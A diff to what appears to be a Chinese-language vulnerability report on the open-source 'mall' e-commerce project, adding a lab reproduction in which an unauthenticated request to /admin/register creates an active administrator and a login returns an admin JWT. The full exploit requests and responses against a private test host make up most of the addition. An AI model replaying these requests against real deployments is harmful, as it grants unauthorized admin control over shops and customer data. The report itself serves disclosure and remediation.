@@ -148,8 +148,61 @@ curl -X POST "http://<target>/mall-portal/alipay/notify" \
 5. **订单状态幂等**：禁止 `/alipay/query` 在未通过回调时直接标记支付成功
 6. **提供 fork 模板**：macrozheng 可在 README 增加部署安全 checklist
 
+## 实机验证（已复现）
+
+**环境**：mall 最新分支，自编译 JAR + MySQL 5.7，Docker 部署于 192.168.217.135
+
+### 步骤1: 未授权注册管理员账户
+
+**请求报文**：
+```http
+POST /admin/register HTTP/1.1
+Host: 192.168.217.135:48080
+Content-Type: application/json
+
+{"username":"attacker","password":"Attack123!","nickName":"Attacker","email":"attacker@evil.com","note":"PoC"}
+```
+
+**响应报文**：
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"code":200,"message":"操作成功","data":{"id":11,"username":"attacker",
+"password":"$2a$10$CCTdNbNhCj8/MWLk95rW8uiCY5HhLTp8CaGSlnn.0SRWtqCz7UN3y",
+"icon":null,"email":"attacker@evil.com","nickName":"Attacker","note":"PoC",
+"createTime":"2026-04-14T03:29:13.748+00:00","loginTime":null,"status":1}}
+```
+
+**`status:1` 表示账户直接激活，无需审批。**
+
+### 步骤2: 使用新账户登录获取管理员 Token
+
+**请求报文**：
+```http
+POST /admin/login HTTP/1.1
+Host: 192.168.217.135:48080
+Content-Type: application/json
+
+{"username":"attacker","password":"Attack123!"}
+```
+
+**响应报文**：
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"code":200,"message":"操作成功","data":{
+  "tokenHead":"Bearer ",
+  "token":"eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhdHRhY2tlciIsImNyZWF0ZWQiOjE3NzYxMzczNjM4NTksImV4cCI6MTc3Njc0MjE2M30.HZBWtyhfAEwZOl720QYob_cz4EQIed6n6L0EIhD4jSnwXmahxuI6Xp4aAhlfZ6HHV4EubgWw2echFFawiWvyPg"
+}}
+```
+
+**攻击者在不拥有任何初始凭据的情况下获得了有效的后台管理 JWT Token。**
+
 ## 验证环境
 
-- 源代码：mall 最新分支（静态代码分析）
+- 源代码：mall 最新分支（自编译 + Docker 部署）
+- 测试环境：192.168.217.135:48080
 - 框架：Spring Boot + Spring Security + MyBatis
 - 日期：2026-04-14
